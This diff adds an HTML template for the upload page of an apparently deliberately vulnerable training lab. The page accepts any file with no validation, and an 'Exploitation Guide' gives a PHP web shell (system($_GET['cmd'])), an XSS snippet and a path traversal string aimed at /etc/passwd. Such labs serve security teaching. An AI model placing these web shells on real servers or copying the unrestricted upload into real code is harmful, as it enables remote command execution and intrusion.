@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Upload - Vulnerable Lab</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>📤 File Upload</h1>
+        
+        <div class="warning-box">
+            <strong>⚠️ Unrestricted File Upload Vulnerability:</strong>
+            No file type validation or restrictions!
+        </div>
+        
+        <form method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label>Select file to upload:</label><br>
+                <input type="file" name="file" required>
+            </div>
+            <input type="submit" value="Upload File">
+        </form>
+        
+        <div class="exploitation-guide">
+            <h3>Exploitation Guide:</h3>
+            <p>Try uploading:</p>
+            <ul>
+                <li>PHP web shell: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+                <li>HTML file with XSS: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                <li>Large files to test DoS</li>
+                <li>Path traversal: <code>../../../etc/passwd</code> (if renamed)</li>
+            </ul>
+            
+            <h4>Create a Simple Web Shell:</h4>
+            <textarea rows="4" cols="60" readonly>
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+            </textarea>
+            <p>Save as <code>shell.php</code> and upload, then access at <code>/uploads/shell.php?cmd=whoami</code></p>
+        </div>
+        
+        <p><a href="/">← Back to Home</a></p>
+    </div>
+</body>
+</html>
